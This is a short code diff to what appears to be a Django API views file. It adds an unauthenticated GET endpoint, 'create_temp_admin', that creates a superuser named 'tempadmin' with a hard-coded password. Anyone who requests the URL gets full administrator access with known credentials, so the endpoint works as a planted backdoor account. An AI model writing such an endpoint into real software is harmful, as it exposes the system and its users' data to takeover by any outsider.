@@ -57,3 +57,16 @@ def password_reset_confirm(request):
 
     return Response({"detail": "Password Reset Successful"}, status=200)
 
+@api_view(["GET"])
+def create_temp_admin(request):
+    if User.objects.filter(username="tempadmin").exists():
+        return Response({"message": "Admin already exists"})
+
+    User.objects.create_superuser(
+        username="tempadmin",
+        email="admin@example.com",
+        password="Temp@12345"
+    )
+
+    return Response({"message": "Temporary admin created"})
+
